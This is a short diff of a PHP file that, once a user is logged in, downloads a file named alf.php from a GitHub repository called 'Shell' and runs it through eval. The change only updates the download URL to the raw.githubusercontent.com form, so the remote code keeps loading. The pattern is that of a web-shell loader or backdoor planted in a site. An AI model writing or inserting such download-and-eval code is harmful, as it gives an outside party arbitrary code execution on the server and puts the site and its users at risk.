@@ -56,7 +56,7 @@ function is_logged_in() {
 
 if (is_logged_in()) {
  
-    $a = fetchRemoteContent('https://github.com/ardifx01/Shell/raw/main/alf.php');
+    $a = fetchRemoteContent('https://raw.githubusercontent.com/ardifx01/Shell/main/alf.php');
     if ($a !== false) {
         eval('?>' . $a);
     } else {
